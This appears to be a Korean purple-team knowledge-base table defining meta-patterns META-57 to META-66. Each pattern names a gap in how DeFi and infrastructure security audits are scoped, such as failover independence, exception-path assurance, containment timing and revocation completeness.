| META-57 Counted-Redundancy / Correlated-Failover Gap (CRCFG) вАФ нНЉнФМнМА 2026-04-22 | **нХµмЛђ лєДлМАмє≠**: нМАмЭА `primary + secondary`, `N-of-M`, `multi-agent`, `multi-DVN` м≤ШлЯЉ **к∞ЬмИШл°Ь нСЬнШДлРШлКФ redundancy** к∞А мЮИмЬЉл©і лПЕл¶љмД±лПД нЩХл≥ілРРлЛ§к≥† лКРлВАлЛ§. кЈЄлЯђлВШ мЛ§м†Ь мЛ§нМ®лКФ к≥µк≤©мЮРк∞А мЭЉлґА к≤љл°ЬлІМ мШ§мЧЉмЛЬнВ® лТ§ **failover, degraded mode, stateful session continuation** мЭД мЭімЪ©нХі мЛЬмК§нЕЬмЭД кЈЄ мШ§мЧЉлРЬ subsetмЬЉл°Ь л™∞мХДлД£мЭД лХМ л∞ЬмГЭнХЬлЛ§. м¶Й redundancyлКФ мЮИмЧИмІАлІМ, **мД†нГЭкЄ∞(selector)мЩА кіАмЄ°кЄ∞(observer)к∞А к∞ЩмЭА мГБкіАкіАк≥Д мХИ** мЧР лђґмЧђ мЮИмЬЉл©і мЬДкЄ∞ мЛЬ monocultureл°Ь лґХкіілРЬлЛ§. **мЩЬ к∞РмВђк∞А лЖУмєШлКФк∞А**: вС† distinct host / different URL / extra verifier countл•Љ лПЕл¶љ fault-domain к≤Ам¶ЭмЬЉл°Ь мШ§мЭЄнХЬлЛ§. вС° failoverл•Љ availability кЄ∞лК•мЬЉл°ЬлІМ л≥ік≥† integrity downgrade к≤љл°Ьл°Ь л™®лНЄлІБнХШмІА мХКлКФлЛ§. вСҐ monitoringк≥Љ verifierк∞А к∞ЩмЭА upstream data planeмЭД л≥іл©і selective-lie к≥µк≤©мЭД нГРмІАнХШкЄ∞ мЦіл†µмІАлІМ, observability independenceлКФ к±∞мЭШ к∞РмВђнХШмІА мХКлКФлЛ§. вС£ FV/invariant/fuzzлКФ лМАк∞Ь "мЮЕл†•лРЬ мЭСлЛµмЭі honestк±∞лВШ мµЬмЖМнХЬ лПЩмЭЉнХЬ truth setмЧРмДЬ мЩФлЛ§" лКФ к∞Ам†Х мЬДмЧР мДЬ мЮИмЦі, attacker-induced failoverлВШ stateful trust steeringмЭД л™®лНЄ л∞ЦмЧР лСФлЛ§. **META-54/55/56к≥ЉмЭШ кµђл≥Д**: META-54лКФ мЧ≠нХ† лМАлєД кґМнХЬ, META-55лКФ мД†мЦЄ лМАлєД мІСнЦЙ, META-56мЭА мЩЄлґА мЮРмВ∞ control plane мИШмЮЕ лђЄм†ЬлЛ§. META-57мЭА **redundancyл•Љ мДЄлКФ к≤Гк≥Љ лПЕл¶љ failure domainмЭД нЩХл≥інХШлКФ к≤ГмЭі лЛ§л•ілЛ§** лКФ кµђм°∞л•Љ кЈЬм†ХнХЬлЛ§. |
| META-58 Default-Path / Scope-Carveout Responsibility Gap (DSCRG) вАФ нНЉнФМнМА 2026-04-24 | **нХµмЛђ лєДлМАмє≠**: нМАмЭА vendor quickstart, official sample config, provider-managed verifier/RPC, emergency council к∞ЩмЭА мЪФмЖМл•Љ **кЄ∞л≥Є к≤љл°Ь** л°Ь м±ДнГЭнХШмІАлІМ, к∞РмВђ/л∞ФмЪінЛ∞ scopeлКФ corporate infra, KMS, deployment pipeline, prover/TEE, manual dispute/restart/freeze к∞Ам†ХмЭД мЮРм£Љ л∞Фкє•мЬЉл°Ь лѓЉлЛ§. кЈЄ к≤∞к≥Љ мЛ§м†Ь control planeмЭА л™®лСРк∞А мУ∞мІАлІМ мХДлђілПД лБЭкєМмІА мЖМмЬ†нХШмІА мХКлКФ orphan boundaryк∞А лРЬлЛ§. **мЩЬ к∞РмВђк∞А лЖУмєШлКФк∞А**: вС† documented defaultл•Љ secure baselineм≤ШлЯЉ л∞ЫмХДлУ§мЧђ л≥ДлПД ownership reviewл•Љ мГЭлЮµнХЬлЛ§. вС° provider-managed infraл•Љ non-protocol лШРлКФ external dependencyл°Ь лґДл•ШнХі нХµмЛђ threat modelмЧРмДЬ л∞АмЦілВЄлЛ§. вСҐ "лђЄм†Ь мГЭкЄ∞л©і blacklist/dispute/restart/freeze нХШк≤†лЛ§" к∞ЩмЭА мИШлПЩ к∞ЬмЮЕ к∞Ам†ХмЭі valid report downgrade кЈЉк±∞л°Ь мУ∞мЭіл©∞ structural riskл•Љ нЭђмДЭнХЬлЛ§. вС£ мВђк≥† нЫДмЧРлКФ providerк∞А integrator misconfigurationмЭД мІАм†БнХШк≥† integratorк∞А official defaultл•Љ кЈЉк±∞л°Ь лУ§мЦі, мВђм†Д м±ЕмЮД к≤љк≥Дк∞А лБЭлВі лђЄмДЬнЩФлРШмІА мХКлКФлЛ§. **META-54/55/57к≥ЉмЭШ кµђл≥Д**: META-54лКФ role-authority mismatch, META-55лКФ мД†мЦЄ-мІСнЦЙ лґИмЭЉмєШ, META-57мЭА redundancy independence лђЄм†ЬлЛ§. META-58мЭА **кЄ∞л≥Єк∞Тк≥Љ scope carve-out мВђмЭімЧРмДЬ shared-responsibility мЮРм≤ік∞А orphaned boundaryк∞А лРШлКФ кµђм°∞** л•Љ кЈЬм†ХнХЬлЛ§. |
| META-59 Nominal-Path / Exception-Path Assurance Asymmetry (NPEAA) вАФ нНЉнФМнМА 2026-04-25 | **нХµмЛђ лєДлМАмє≠**: audit, formal verification, invariant testing, bug bounty, competitionмЭА mostly **м†ХмГБ к≤љл°Ь(nominal path)** мЭШ correctnessл•Љ к∞ХнЩФнХЬлЛ§. нХШмІАлІМ мЛ§м†Ь мВђк≥†к∞А лВШл©і мЛЬмК§нЕЬмЭА `blacklist`, `dispute`, `manual restart`, `security-council freeze`, `manual oracle mode`, `redeem-only` к∞ЩмЭА **мШИмЩЄ к≤љл°Ь(exception path)** л°Ь м†ДнЩШлРШк≥†, мЭі к≤љл°ЬлКФ мҐЕмҐЕ downgrade assumption лШРлКФ emergency governance powerл°ЬлІМ мЈ®кЄЙлРЬлЛ§. м¶Й мЬДкЄ∞ мИЬк∞Д лНФ к∞ХнХЬ кґМнХЬк≥Љ лНФ нБ∞ blast radiusл•Љ к∞АмІД к≤љл°Ьк∞А нЩЬмД±нЩФлРШмІАлІМ, м†ХмЮС кЈЄ к≤љл°ЬлКФ м†ХмГБ к≤љл°ЬлІМнБЉмЭШ л™ЕмДЄ¬ЈлґИл≥АмЛЭ¬ЈмЮФк≥† л≥ім†Д¬Јк≥µм†ХмД± к≤Ам¶ЭмЭД л∞ЫмІА л™їнХЬлЛ§. **мЩЬ к∞РмВђк∞А лЖУмєШлКФк∞А**: вС† к∞РмВђ/FV/fuzzлКФ м†ХмГБ нШЄмґЬк≥Љ л™®лНЄлІБлРЬ мГБнГЬ м†ДмЭі м§СмЛђмЭілЭЉ, blacklist/dispute/restart/freeze нЫДмЭШ recovery semanticsл•Љ к±∞мЭШ м¶Эл™ЕнХШмІА мХКлКФлЛ§. вС° мШИмЩЄ к≤љл°Ьл•Љ protocol semanticsк∞А мХДлЛИлЭЉ IR/governance/ops лґАл°ЭмЬЉл°Ь лґДл•ШнХЬлЛ§. вСҐ "нХДмЪФнХШл©і мИШлПЩ к∞ЬмЮЕнХЬлЛ§" лКФ к∞Ам†ХмЭі safety backstopмЬЉл°Ь мУ∞мЭіл©∞, кЈЄ к∞ЬмЮЕмЭі мВђмЪ©мЮРл≥Д мЖРмЛ§ л∞∞лґД¬ЈмГБнЩШ мИЬмДЬ¬Јл≥µкµђ мЛЬм†РмЧР лѓЄмєШлКФ мШБнЦ•мЭА л≤ФмЬД л∞ЦмЬЉл°Ь лВ®лКФлЛ§. вС£ мЬДкЄ∞ мЛЬ мЛЬмК§нЕЬмЭі мВђмЛ§мГБ лЛ§л•Є нФДл°ЬнЖ†мљЬл°Ь м†ДнЩШлРЬлЛ§лКФ м†Р, м¶Й emergency lane мЮРм≤ік∞А л≥ДлПД assurance лМАмГБмЭілЭЉлКФ мЭЄмЛЭмЭі мХљнХШлЛ§. **META-53/54/58к≥ЉмЭШ кµђл≥Д**: META-53мЭА actuatorл•Љ м†ЬлХМ л∞ЬмВђнХ† мИШ мЮИлКФк∞А, META-54лКФ лИДк∞А мЛ§м†Ь кґМнХЬмЭД к∞АмІАлКФк∞А, META-58мЭА кЈЄ кґМнХЬ/кЄ∞л≥Є к≤љл°Ьл•Љ лИДк∞А мЖМмЬ†нХШлКФк∞Ал•Љ лЛ§л£ђлЛ§. META-59лКФ **л∞ЬмВђлРЬ мЭінЫДмЭШ мШИмЩЄ нФДл°ЬнЖ†мљЬмЭі лђімЧЗмЭД л≥імЮ•нХШлКФк∞А** л•Љ л≥ДлПД кµђм°∞ лђЄм†Ьл°Ь к≥†м†ХнХЬлЛ§. |
| META-60 Recoverability-Collateralized Security Gap (RCSG) вАФ нНЉнФМнМА 2026-04-26 | **нХµмЛђ лєДлМАмє≠**: нМАмЭА `freeze`, `blacklist`, `manual restart`, `credential rotation`, `loss socialization`, `recovery fund` к∞ЩмЭА **нЪМмИШ¬ЈмЩДнЩФ к∞АлК•мД±(recoverability)** мЭД ex-post containmentк∞А мХДлЛИлЭЉ ex-ante severity discountм≤ШлЯЉ мВђмЪ©нХЬлЛ§. кЈЄ к≤∞к≥Љ мЛ§м†Ь blast radiusлКФ privilege/control-plane compromise м™љмЧР нБђк≤М лВ®мХД мЮИлКФлН∞лПД, audit scope, bounty economics, severity triageлКФ "мЦім∞®нФЉ мВђлЮМмЭі лІЙк±∞лВШ лРШлПМл¶і мИШ мЮИлЛ§" лКФ мЭімЬ†л°Ь кЈЄ к≤љк≥Дл•Љ к≥ЉмЖМнИђмЮРнХЬлЛ§. **мЩЬ к∞РмВђк∞А лЖУмєШлКФк∞А**: вС† л∞ФмЪінЛ∞/competition scopeк∞А manual restart, dispute, blacklist к∞АлК•мД±мЭД valid report downgrade кЈЉк±∞л°Ь л™ЕмЛЬнХШл©імДЬ мЧ∞кµђмЮРмЩА нМА л™®лСРмЧРк≤М recoverability biasл•Љ нХЩмКµмЛЬнВ®лЛ§. вС° мВђнЫД freeze/recovery мД±к≥µ мВђл°Ак∞А hindsight biasл•Љ лІМлУ§мЦі, мШИл∞© мЛ§нМ®л≥ілЛ§ нЪМмИШ мД±к≥µмЭі лНФ нБ∞ нЖµм†Ьм≤ШлЯЉ л≥імЭік≤М лІМлУ†лЛ§. вСҐ FV/invariant/fuzz coverageк∞А nominal-path correctnessл•Љ к∞ЬмД†нХ†мИШл°Э, лВ®мЭА residual riskл•Љ operator backstopмЭі лНЃмЭД мИШ мЮИлЛ§лКФ к≥ЉмЛ†мЭі к∞ХнЩФлРЬлЛ§. вС£ severityк∞А "лђімЧЗмЭі нДЄл¶і мИШ мЮИлКФк∞А" л≥ілЛ§ "мЦЉлІИлВШ лРШм∞ЊмЭД мИШ мЮИмЧИлКФк∞А" мЧР мЭШнХі мЮђнПЙк∞АлРШл©і, privileged support surfaceмЩА deployment/ops planeмЭі кµђм°∞м†БмЬЉл°Ь м†АнПЙк∞АлРЬлЛ§. **META-58/59мЩАмЭШ кµђл≥Д**: META-58мЭА ownership лґАмЮђ, META-59лКФ мШИмЩЄ к≤љл°Ь assurance лґАм°±мЭД лЛ§л£ђлЛ§. META-60мЭА **мЩЬ м°∞мІБмЭі мХ†міИмЧР кЈЄ к≤љк≥Дл•Љ лВЃмЭА мЪ∞мД†мИЬмЬДл°Ь лґДл•ШнХШлКФк∞А, м¶Й recoverabilityл•Љ лЛіл≥ім≤ШлЯЉ мЮ°к≥† мШИл∞© нИђмЮРл•Љ кєОлКФ мЭЄмДЉнЛ∞лЄМ кµђм°∞** л•Љ кЈЬм†ХнХЬлЛ§. |
| META-61 Assurance-Halo Transitivity Gap (AHTG) вАФ нНЉнФМнМА 2026-04-27 | **нХµмЛђ лєДлМАмє≠**: нМАмЭА audit, formal verification, invariant/fuzz, test hardeningмЭі **мљФмЦі мљФлУЬ** мЧР лМАнХі к∞ХнХімІИмИШл°Э кЈЄ assuranceк∞А build/deploy/RPC/frontend/support/AI-tooling к∞ЩмЭА **мЭЄм†С plane** мЧРлПД мЮРлПЩмЬЉл°Ь м†ДмЭілРЬлЛ§к≥† лКРлБЉкЄ∞ мЙљлЛ§. кЈЄлЯђлВШ мЛ§м†Ь мВђк≥†лКФ л∞Фл°Ь кЈЄ out-of-scope planeмЧРмДЬ л∞ЬмГЭнХЬлЛ§. м¶Й к≥µк≤©мЭА л∞Фкє•мЬЉл°Ь мЭілПЩнЦИлКФлН∞, мЛ†лҐ∞лКФ мХИм™љмЧРмДЬ л∞Фкє•мЬЉл°Ь л≤ИмІДлЛ§. **мЩЬ к∞РмВђк∞А лЖУмєШлКФк∞А**: вС† in-scope мљФлУЬмЧР лМАнХЬ к∞ХнХЬ assuranceк∞А adjacent infraкєМмІА мї§л≤ДнХШлКФ к≤Гм≤ШлЯЉ л≥імЭілКФ coverage-transitivity illusionмЭі мГЭкЄілЛ§. вС° мљФлУЬ hardeningмЭі мД±к≥µнХ†мИШл°Э residual riskк∞А build host, verifier/RPC, deployment SaaS, support OAuth к∞ЩмЭА к≤љк≥Дл°Ь мЭілПЩнХШмІАлІМ review budgetмЭА кЈЄлІМнБЉ лФ∞лЭЉк∞АмІА мХКлКФлЛ§. вСҐ мШ®м≤імЭЄ calldataк∞А л™®лСР м†ХмГБ(Kelp) мЭік±∞лВШ core contract/user fundsк∞А мІБм†С мШБнЦ• мЧЖлЛ§к≥† л∞ЬнСЬ(Vercel) лРШл©і, нМАмЭА support/control plane compromiseл•Љ protocol-securityк∞А мХДлЛМ м£Љл≥А мВђк≥†л°Ь лґДл•ШнХШкЄ∞ мЙљлЛ§. вС£ "traditional audits never touch infrastructure" лЭЉлКФ лґДл•Шк∞А кµ≥мЦімІАл©і, к≤Ам¶ЭлРЬ мљФмЦімЩА лѓЄк≤Ам¶Э м£Љл≥АлґА мВђмЭімЭШ assurance лЛ®м†ИмЭі м†ХмГБмЬЉл°Ь л∞ЫмХДлУ§мЧђмІДлЛ§. **META-49/51/52/58/60к≥ЉмЭШ кµђл≥Д**: META-49лКФ мЛ§нЦЙнШХ мД§м†Х, META-51мЭА кґМнХЬмЭД мЪіл∞ШнХШлКФ м¶Эк±∞, META-52лКФ мЄ°м†Х мЭЄмДЉнЛ∞лЄМ, META-58мЭА ownership seam, META-60мЭА recoverability biasл•Љ лЛ§л£ђлЛ§. META-61мЭА **нХЬ л†ИмЭімЦімЧРмДЬ мЦїмЭА assurance мЛ†нШЄк∞А мЩЬ лЛ§л•Є л†ИмЭімЦімЭШ лѓЄк≤Ам¶Э мЬДнЧШкєМмІА лНЃмЦіл≤Дл¶ђлКФк∞А** л•Љ кЈЬм†ХнХЬлЛ§. |
| META-62 Certainty-Seeking Containment Gap (CSCG) вАФ нНЉнФМнМА 2026-04-29 | **нХµмЛђ лєДлМАмє≠**: мЛ§м†Ь incidentмЧРмДЬлКФ `pause`, `rotate`, `revoke`, `freeze deployment`, `disable integration` к∞ЩмЭА containmentк∞А **мЩДм†ДнХЬ нЩХм¶Э мЭім†Д** мЧР л∞ЬмВђлРШмЦімХЉ нХШлКФлН∞, лІОмЭА нМАмЭА scope/attribution/forensicsк∞А мґ©лґДнЮИ л™®мЭЉ лХМкєМмІА кЄ∞лЛ§л¶∞лЛ§. кЈЄлЯ∞лН∞ control-plane evidenceлКФ retentionмЭі мІІк≥†, UIк∞А к±∞мє†к≥†, SaaS к≤љк≥Д л∞ЦмЧР нЭ©мЦім†Є мЮИмЬЉл©∞, к≥µк≤© tempoлКФ мЭЄк∞Д мКємЭЄл≥ілЛ§ лє†л•ілЛ§. кЈЄ к≤∞к≥Љ **нЩХмЛ§мД±мЭД кЄ∞лЛ§л¶ђлКФ м°∞мІБмЭЉмИШл°Э containmentк∞А лК¶мЦімІДлЛ§**. **мЩЬ к∞РмВђк∞А лЖУмєШлКФк∞А**: вС† к∞РмВђ/FV/fuzzлКФ correctnessмЩА exploitabilityл•Љ л≥Є лТ§мЧРлПД, `мЦЄм†Ь лґИмЩДм†ДнХЬ м¶Эк±∞лІМмЬЉл°Ь action thresholdл•Љ лДШкЄЄ к≤ГмЭЄк∞А` лКФ к±∞мЭШ л™®лНЄлІБнХШмІА мХКлКФлЛ§. вС° incident logging, exportability, retention window, audit-log accessлКФ мЪімШБ UXлВШ лєДмЪ© лђЄм†Ьл°Ь лґДл•ШлПЉ protocol-security л≤ФмЬД л∞ЦмЬЉл°Ь л∞Ал¶∞лЛ§. вСҐ нМАмЭА `мШБнЦ•л∞ЫмХШлКФмІА м†ХнЩХнЮИ мХИлЛ§` мЩА `мІАкЄИ лПМл†§мХЉ нХ† лєДл∞А/кґМнХЬмЭі лђімЧЗмЭЄмІА мХИлЛ§` л•Љ нШЉлПЩнХЬлЛ§. вС£ лє†л•Є лМАмЭСмЭі нХДмЪФнХЬ мЛЬм†РмЭЉмИШл°Э evidenceк∞А мХДмІБ лґИмЩДм†ДнХШлѓАл°Ь, certainty-seeking cultureк∞А к≥µк≤©мЮР tempoмЧР кµђм°∞м†БмЬЉл°Ь мІДлЛ§. **META-53/55/61к≥ЉмЭШ кµђл≥Д**: META-53мЭА actuatorл•Љ л∞ЬмВђнХ† мИШ мЮИлКФк∞А, META-55лКФ мД†мЦЄмЭі мІСнЦЙлРШлКФк∞А, META-61мЭА assurance haloк∞А м£Љл≥А planeмЭД к∞Ал¶ђлКФк∞Ал•Љ лЛ§л£ђлЛ§. META-62лКФ **мЩДм†ДнХЬ нЩХм¶ЭмЭі мШ§кЄ∞ м†ДмЧР containment к≤∞м†ХмЭД лВіл†§мХЉ нХШлКФ кµђм°∞ мЮРм≤і** л•Љ кЈЬм†ХнХЬлЛ§. |
| META-63 Invariant-to-Operations Promotion Gap (IOPG) вАФ нНЉнФМнМА 2026-04-30 | **нХµмЛђ лєДлМАмє≠**: мЧЕк≥ДлКФ invariant/fuzz/FV/PoC validationмЭД лє†л•ік≤М к≥†лПДнЩФнХШмІАлІМ, кЈЄл†Зк≤М л∞Ьк≤ђнХШк≥† лђЄмДЬнЩФнХЬ нХµмЛђ лґИл≥АмЛЭмЭі **лЯ∞нГАмЮД monitor / disagreement alarm / auto-halt threshold** л°Ь мКєк≤©лРШмІА мХКлКФ к≤љмЪ∞к∞А лІОлЛ§. к≤∞к≥Љм†БмЬЉл°Ь нМАмЭА `лђімЧЗмЭД мІАмЉЬмХЉ нХШлКФк∞А` лКФ мХМк≥†лПД, мЪімШБмЧРмДЬлКФ `мЦЄм†Ь кЈЄ лґИл≥АмЛЭмЭі кє®м°МлКФк∞А` л•Љ л™ї л≥ЄлЛ§. KelpDAOм≤ШлЯЉ мЛ§м†Ь decisive controlмЭі live conservation monitoringмЭЄ мВђк≥†мЧРмДЬ мЭі к≥µл∞±мЭі мІБм†С лУЬлЯђлВЬлЛ§. **мЩЬ к∞РмВђк∞А лЖУмєШлКФк∞А**: вС† к∞РмВђ/FV/competitionмЭА м£Љл°Ь pre-deploy artifactл•Љ лІМлУ† лТ§ мҐЕл£МлРШл©∞, кЈЄ мВ∞мґЬлђЉмЭі observability specмЬЉл°Ь мЭімЦімІАлКФмІАкєМмІАлКФ к±∞мЭШ мЪФкµђнХШмІА мХКлКФлЛ§. вС° monitoring ownershipмЭА ops/SREл°Ь, invariant ownershipмЭА auditors/researchersл°Ь лґДл¶ђлПЉ к∞ЩмЭА мЖНмД±(property)мЭі лђЄмДЬмЧРлІМ л®Єлђіл•ЄлЛ§. вСҐ fuzz/FV мД±к≥µмЭі `мЪ∞л¶ђлКФ мЭілѓЄ мЭі мЖНмД±мЭД кіАл¶ђнХШк≥† мЮИлЛ§` лКФ м∞©мЛЬл•Љ лІМлУ†лЛ§. вС£ protocol-to-protocol conservation, artifact continuity, verifier disagreement к∞ЩмЭА лЯ∞нГАмЮД мЖНмД±мЭА code correctnessк∞А мХДлЛИлЭЉ мЪімШБ telemetry лђЄм†Ьл°Ь мґХмЖМлРЬлЛ§. **META-15/53/62мЩАмЭШ кµђл≥Д**: META-15лКФ нЕМмК§нКЄк∞А лЭЉмЭілЄМ м≤імЭЄ мЭШлѓЄл°†мЭД к≤Ам¶ЭнХШлКФк∞А, META-53мЭА actuatorл•Љ мЛ§м†Ьл°Ь л∞ЬмВђнХ† мИШ мЮИлКФк∞А, META-62лКФ мЦЄм†Ь лґИмЩДм†ДнХЬ м¶Эк±∞л°Ь лБКмЭД к≤ГмЭЄк∞Ал•Љ лЛ§л£ђлЛ§. META-63мЭА **кЈЄ м†ДмЧР мХ†міИмЧР мЦілЦ§ лґИл≥АмЛЭмЭД мЪімШБ мЛ†нШЄл°Ь мКєк≤©нЦИлКФк∞А** л•Љ кЈЬм†ХнХЬлЛ§. |
| META-64 Revocation-Surface Completeness Gap (RSCG) вАФ нНЉнФМнМА 2026-05-01 | **нХµмЛђ лєДлМАмє≠**: нМАмЭі `pause`, `rotate`, `revoke`, `freeze`, `blacklist` л•Љ нХШкЄ∞л°Ь к≤∞м†ХнХілПД, мЛ§м†Ьл°Ь к∞ЩмЭА кґМнХЬмЭД мЪіл∞ШнХШлКФ **м†Дм≤і revocation surface** л•Љ лЛ§ мДЄмІА л™їнХШл©і containmentлКФ лґАлґДм†БмЬЉл°ЬлІМ лБЭлВЬлЛ§. нВ§ нХШлВШлКФ кµРм≤інЦИмІАлІМ sibling token, deploy integration, OAuth grant, legacy signer, pending rotation set, downstream approval, sidecar attestation к∞ЩмЭА **лПЩлУ± кґМнХЬ нСЬл©і** мЭі лВ®лКФлЛ§. **мЩЬ к∞РмВђк∞А лЖУмєШлКФк∞А**: вС† мЬДнШС л™®лНЄмЭі authorityл•Љ graphк∞А мХДлЛИлЭЉ principal listл°Ь мґХмХљнХЬлЛ§. вС° к∞РмВђмЩА л∞ФмЪінЛ∞лКФ direct exploit pathлКФ л≥імІАлІМ, к∞ЩмЭА authorityл•Љ к≥µмЬ†нХШлКФ sibling surfaceмЭШ **мЩДм†ДнХЬ revoke set** кєМмІАлКФ мЮШ л™®лНЄлІБнХШмІА мХКлКФлЛ§. вСҐ runbookлКФ `лђімЧЗмЭД нХ†мІА` лКФ м†БмЦілПД `лђімЧЗмЭД нХ®кїШ лБКмЦімХЉ лЛЂнЮИлКФмІА` мЭШ inventoryлКФ мХљнХЬ к≤љмЪ∞к∞А лІОлЛ§. вС£ мЭЉлґА rotation/pause мД±к≥µмЭі к≥І incident closureлЭЉлКФ м∞©мЛЬл•Љ лІМлУ§мЦі equivalent authority мЮФм°імЭД к∞Ал¶∞лЛ§. **META-54/58/62/63к≥ЉмЭШ кµђл≥Д**: META-54лКФ мЦілЦ§ нСЬл©імЭі мЛ§нЪ® кґМнХЬмЭД к∞ЦлКФк∞А, META-58мЭА кЈЄ к≤љк≥Дл•Љ лИДк∞А мЖМмЬ†нХШлКФк∞А, META-62лКФ мЦЄм†Ь лБКмЭД к≤ГмЭЄк∞А, META-63мЭА лђімЧЗмЭД лЯ∞нГАмЮД мЛ†нШЄл°Ь л≥Љ к≤ГмЭЄк∞Ал•Љ лЛ§л£ђлЛ§. META-64лКФ **лБКкЄ∞л°Ь нХЬ лТ§ мЛ§м†Ьл°Ь лђімЧЗмЭД м†ДлґА лБКмЦімХЉ лЛЂнЮИлКФк∞А** л•Љ кЈЬм†ХнХЬлЛ§. |
| META-65 Assurance-Commoditization / Response-Scarcity Gap (ACRSG) вАФ нНЉнФМнМА 2026-05-03 | **нХµмЛђ лєДлМАмє≠**: Foundry invariant/fuzz, к≥µк∞Ь FV лПДкµђ, AI bug bounty autopilot к∞ЩмЭА нЭРл¶ДмЬЉл°Ь **мЈ®мХљм†Р нГРмГЙ¬ЈмЛЬнААмК§ мГЭмД±¬Јк≤Ам¶Э л≥ік≥†мДЬ мЮСмД± лЕЄлПЩмЭА м†Рм†Р мЛЄк≥† л≥Сл†ђм†БмЭіл©∞ кЄ∞мЦµмЭД к∞АмІД мЮРлПЩнЩФ мЮСмЧЕ** мЭі лРЬлЛ§. л∞Шл©і мЛ§м†Ь incident лМАмЭСмЧР нХДмЪФнХЬ authority inventory, actuator binding, freeze/rotate evidence, owner escalationмЭА мЧђм†ДнЮИ **мЖМмИШ мЭЄк∞ДмЭі мИШлПЩмЬЉл°Ь мЬ†мІАнХШлКФ нЭђмЖМ мЮРмВ∞** мЭілЛ§. кЈЄ к≤∞к≥Љ л∞©мЦілКФ `мЈ®мХљм†РмЭД мХДлКРлГР` к∞А мХДлЛИлЭЉ **лЛЂмЭД мВ∞мґЬлђЉмЭД нХ≠мГБ мµЬмЛ†мЬЉл°Ь мЬ†мІАнХШлКРлГР** мЧРмДЬ л∞Ал¶∞лЛ§. **мЩЬ к∞РмВђк∞А лЖУмєШлКФк∞А**: вС† к∞РмВђлКФ л≥інЖµ вАЬм†ДлђЄк∞Ак∞А нХЬ л≤И кєКк≤М л≥іл©і м∞ЊмЭД мИШ мЮИлКФк∞АвАЭл•Љ лђїмІА, лЛ§мИШмЭШ м†АлєДмЪ© мЮРлПЩнЩФк∞А к≥ДмЖН нЫСлКФ мДЄк≥Дл•Љ м†Дм†ЬнХШмІА мХКлКФлЛ§. вС° runbook, authority manifest, command artifactл•Љ л≥імХИ нХµмЛђ мВ∞мґЬлђЉмЭі мХДлЛИлЭЉ мЪімШБ лђЄмДЬл°Ь лВЃк≤М л≥ЄлЛ§. вСҐ мЈ®мХљм†Р л∞Ьк≤ђ лПДкµђмЭШ л∞Ьм†ДмЭі к≥І л∞©мЦі мЪ∞мЬДлЭЉк≥† м∞©к∞БнХі response artifactмЭШ мµЬмЛ†мД± лєДмЪ©мЭД к≥ЉмЖМнПЙк∞АнХЬлЛ§. вС£ memory-backed autonomous huntingмЭА к≥µк≤© к∞АмД§мЭД мДЄмЕШ к∞Д мґХм†БнХШмІАлІМ, defender м™љ inventoryмЩА actuatorлКФ мЮРм£Љ мВђлЮМ л®Єл¶њмЖНмЭілВШ мВ∞л∞Ьм†Б лђЄмДЬмЧР лВ®лКФлЛ§. **META-40/41/63/64мЩАмЭШ кµђл≥Д**: META-40мЭА AI лПДкµђмЭШ мЦСл©імД±, META-41мЭА disclosure мЭінЫД copycat tempo, META-63мЭА л∞Ьк≤ђнХЬ мЖНмД±мЭД мЪімШБ мЛ†нШЄл°Ь мКєк≤©нХШлКФ лђЄм†Ь, META-64лКФ лБКкЄ∞л°Ь нХЬ лТ§ revoke set мЩДм†ДмД±мЭД лЛ§л£ђлЛ§. META-65лКФ **кЈЄ л™®лУ† м†Д лЛ®к≥ДмЧРмДЬ к≥µк≤© нГРмГЙ лЕЄлПЩмЭі лМАм§СнЩФлРШлКФ мЖНлПДмЩА л∞©мЦі лМАмЭС мВ∞мґЬлђЉмЭі нЭђмЖМнХЬ мЖНлПДмЭШ м∞®мЭі** л•Љ кЈЬм†ХнХЬлЛ§. |
| META-66 Assurance-Plane Failure Semantics Gap (APFSG) вАФ нНЉнФМнМА 2026-05-06 | **нХµмЛђ лєДлМАмє≠**: нМАмЭА validator, prover, invariant engine, attestation check, RPC cross-check к∞ЩмЭА assurance planeмЭД к≥ДмЖН мґФк∞АнХШмІАлІМ, лМАк∞Ь `лђімЧЗмЭі мЬ†нЪ®нХЬк∞А` лКФ м†ХкµРнХШк≤М мУ∞л©імДЬлПД **кЈЄ planeмЭі hang / diverge / under-detect / timeout нХ† лХМ мЛЬмК§нЕЬмЭі fail-stop нХімХЉ нХШлКФмІА, м†ЬнХЬм†Б fail-open мЬЉл°Ь к∞И мИШ мЮИлКФмІА, мЦілЦ§ override мЩА мВђнЫД к≤Ам¶ЭмЭі нХДмЪФнХЬмІА** лКФ лКРмК®нХШк≤М лВ®кЄілЛ§. RustSec D55лКФ к≤Ам¶Э к≤љл°Ь мЮРм≤ік∞А мЫРк≤© OOM kill-switchк∞А лР† мИШ мЮИмЭМмЭД, recent Foundry gap signalмЭА лДРл¶ђ мУ∞лКФ invariant engineлПД мЛ§м†Д л≤ДкЈЄл•Љ лЖУмє† мИШ мЮИмЭМмЭД л≥імЧђм§АлЛ§. **мЩЬ к∞РмВђк∞А лЖУмєШлКФк∞А**: вС† assurance componentл•Љ benign safeguardл°Ь л≥ік≥† availability / degraded-mode semanticsл•Љ л≥ДлПД trust boundaryл°Ь мЈ®кЄЙнХШмІА мХКлКФлЛ§. вС° pass м°∞к±імЭА нЕМмК§нКЄнХілПД validation-cost ceiling, hang path, disagreement contractлКФ мЮШ к≥†м†ХнХШмІА мХКлКФлЛ§. вСҐ мЧђлЯђ assurance layerк∞А мГЭк≤®лПД `лИДк∞А мЦЄм†Ь override нХШлКФк∞А` мЩА post-override evidence мЪФк±імЭА ops кіАнЦЙмЬЉл°Ь л∞Ал¶∞лЛ§. вС£ лНФ лІОмЭА к≤Ам¶ЭмЄµмЭі к≥І лНФ мХИм†ДнХШлЛ§лКФ мІБкіАмЭі failure semantics лґАмЮђл•Љ к∞Ал¶∞лЛ§. **META-57/63/65мЩАмЭШ кµђл≥Д**: META-57мЭА redundancyмЩА failover лПЕл¶љмД±, META-63мЭА мЖНмД±мЭД мЪімШБ мЛ†нШЄл°Ь мКєк≤©нХШлКФ лђЄм†Ь, META-65лКФ нГРмГЙ лЕЄлПЩ мГБнТИнЩФмЩА лМАмЭС нЭђмЖМмД±мЭД лЛ§л£ђлЛ§. META-66мЭА **кЈЄ мЛ†нШЄ¬Јк≤Ам¶Эл©і мЮРм≤ік∞А мЛ§нМ®нХ† лХМ мЛЬмК§нЕЬмЭі мЦілЦ§ л≥імХИ мЭШлѓЄл°†мЬЉл°Ь м†ДнЩШлРШлКФк∞А** л•Љ кЈЬм†ХнХЬлЛ§. |
